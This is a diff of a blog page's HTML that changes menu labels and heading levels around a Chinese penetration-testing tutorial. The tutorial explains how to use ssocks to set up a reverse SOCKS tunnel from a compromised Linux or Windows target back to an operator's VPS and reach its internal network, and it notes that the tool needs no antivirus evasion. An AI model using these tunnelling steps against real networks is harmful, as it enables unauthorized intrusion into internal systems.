@@ -85,37 +85,25 @@
             
             <li class="menu-item">
                 <a href="/">
-                    主页
+                    home
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/archives">
-                    所有文章
+                    archives
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/about">
-                    关于自己
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    标签
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    分类
+                    about me
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/contact">
-                    一起交流
+                    blogs
                 </a>
             </li>
             
@@ -172,23 +160,22 @@
 
         <!-- Post Content -->
         <p><br></p>
-<h4 id="在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本"><a href="#在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本" class="headerlink" title="在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:"></a>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</h4><p><br></p>
-<h4 id="关于socks反向代理原理的简要说明"><a href="#关于socks反向代理原理的简要说明" class="headerlink" title="关于socks反向代理原理的简要说明:"></a>关于socks反向代理原理的简要说明:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道(有点儿类似管道),说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道<br><br></p>
-<h4 id="在linux中使用ssocks"><a href="#在linux中使用ssocks" class="headerlink" title="在linux中使用ssocks:"></a>在linux中使用ssocks:</h4><p>1,如果目标是linux机器,可能还需要你自己先编译安装下,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
+<h5 id="在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本"><a href="#在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本" class="headerlink" title="在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:"></a>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</h5><p><br></p>
+<h5 id="关于socks反向代理原理的简要说明"><a href="#关于socks反向代理原理的简要说明" class="headerlink" title="关于socks反向代理原理的简要说明:"></a>关于socks反向代理原理的简要说明:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道(有点儿类似管道),说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道<br><br></p>
+<h5 id="在linux中使用ssocks"><a href="#在linux中使用ssocks" class="headerlink" title="在linux中使用ssocks:"></a>在linux中使用ssocks:</h5><p>1,如果目标是linux机器,可能还需要你自己先编译安装下,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
 <p>2,本地机器上执行,一般都是你自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_client.png" alt=""><br></p>
 <p>3,在目标机器上执行(自带台运行选项,实际渗透中可以把它加上):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_server.png" alt=""><br></p>
 <p>4,本地通过各种代理工具,连到socks代理的端口上,即可轻松访问目标内网中的资源<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxychains</div><div class="line">proxifier</div><div class="line">putty</div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_proxifier.png" alt=""><br><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><br><img src="/img/sscosk_proxifier_res.png" alt=""><br></p>
-<h4 id="5-从连接信息中我们看到了socks连接建立成功的提示-如下"><a href="#5-从连接信息中我们看到了socks连接建立成功的提示-如下" class="headerlink" title="5,从连接信息中我们看到了socks连接建立成功的提示,如下"></a>5,从连接信息中我们看到了socks连接建立成功的提示,如下</h4><p><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><br><img src="/img/sscosk_proxifier_res_2.png" alt=""><br></p>
-<p><br><br></p>
-<h4 id="在win中使用ssocks"><a href="#在win中使用ssocks" class="headerlink" title="在win中使用ssocks:"></a>在win中使用ssocks:</h4><p>1,本地机器上执行,一般都是自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_proxifier.png" alt=""><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><img src="/img/sscosk_proxifier_res.png" alt=""><br></p>
+<p>5,从连接信息中我们看到了socks连接建立成功的提示,如下<br><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><img src="/img/sscosk_proxifier_res_2.png" alt=""><br><br><br><br></p>
+<h5 id="在win中使用ssocks"><a href="#在win中使用ssocks" class="headerlink" title="在win中使用ssocks:"></a>在win中使用ssocks:</h5><p>1,本地机器上执行,一般都是自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_win_rcsocks.png" alt=""><br></p>
 <p>2,在目标机器上执行(自带台运行选项,实际渗透中可以把它加上):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks.exe -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_win_rssocks.png" alt=""><br></p>
-<p>3,本地通过各种代理工具,连到socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br><br></p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了(因为根本就不需要免杀),除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
+<p>3,本地通过各种代理工具,连到socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br><br></p>
+<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了(因为根本就不需要免杀),除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
 
     </div>
 
